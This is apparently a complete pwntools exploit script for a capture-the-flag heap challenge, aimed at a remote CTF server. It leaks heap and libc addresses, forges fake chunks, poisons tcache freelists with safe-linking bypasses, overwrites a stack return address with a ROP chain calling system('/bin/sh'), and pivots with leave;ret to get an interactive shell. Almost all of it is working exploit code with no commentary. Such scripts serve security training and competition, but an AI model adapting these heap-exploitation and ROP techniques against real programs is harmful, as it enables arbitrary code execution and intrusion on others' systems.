from pwn import *
from icecream import ic

elf = exe = ELF("./hosc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("ctf.csd.lol", 8888)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def malloc(ind, size):
    sl("malloc")
    sla(":", str(ind))
    sla(":", str(size)) 

def free(ind):
    sl("free")
    sla(":", str(ind))

def scanf(ind, data):
    sl("scanf")
    sla(":", str(ind))
    sl(data)

def puts(ind):
    sl("puts")
    sla(":", str(ind))
    ru("data: ")
'''
malloc(0, 0x20)
free(0)
malloc(0, 0x20)
puts(0)
heap = uu64(5)<<12
free(0)

# malloc(0, 0x100)
# malloc(1, 0x100)

# free(0)

for i in range(14):
    malloc(i, 0x100)

malloc(14, 0x100)

for i in range(14):
    free(i)

for i in range(14):
    malloc(i, 0x10)

ic(hex(heap))
puts(12)
libc.address = uu64(6) - 0x203b20
ic(hex(libc.address))

for i in range(14):
    free(i)

malloc(0, 0x400)
payload = p64(0)
payload += p64(0x325)
payload += p64(heap + 0x1000)
payload += p64(heap + 0x1008)
malloc(1, 0x108)
scanf(1, payload)
malloc(2, 0x108)
malloc(3, 0x108)
malloc(4, 0x4f8)
malloc(5, 0x108)
malloc(6, 0x28)

scanf(6, b'/bin/sh\x00')

scanf(3, b'a'*0x100 + p64(0x320))
'''


malloc(1, 0x500)

malloc(0, 0x10)
free(0)
malloc(0, 0x10)
puts(0)
heap = uu64(5)<<12
free(0)

free(1)
malloc(1, 0x500)
puts(1)
libc.address = uu64(6) - 0x203b20

ic(hex(libc.address))
ic(hex(heap))


malloc(3, 0x38)
payload = p64(0)
payload += p64(0x60)
payload += p64(heap + 0x7d0)
payload += p64(heap + 0x7d0)
malloc(4, 0x28)
malloc(5, 0xf8)
scanf(3, payload)
scanf(4, b'a'*0x20 + p64(0x60))

for i in range(7):
    malloc(i+6, 0xf8)
for i in range(7):
    free(i+6)

free(5)
malloc(6, 0x158)
malloc(7, 0x28)
free(7)

free(4)
target = libc.address + 0x2046e0

scanf(6, b'a'*(0x28) + p64(0x31) + p64(target ^ (heap>>12)))

malloc(8, 0x28)
malloc(9, 0x28)

puts(9)
stack_addr = uu64(6) - 0x210 - 0x18

free(8)
malloc(10, 0x28)
malloc(11, 0x28)
malloc(12, 0x28)

free(11)
free(10)

scanf(6, b'b'*(0x28) + p64(0x31) + p64(stack_addr ^ (heap>>12)))

malloc(10, 0x28)
malloc(11, 0x28)

payload = p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(libc.sym["system"])

scanf(12, payload)
ic(hex(stack_addr))

leave_ret = libc.address + 0x00000000000299d2

scanf(11, b'a'*0x10 + p64(heap + 0x1098) + p64(leave_ret))


io.interactive()
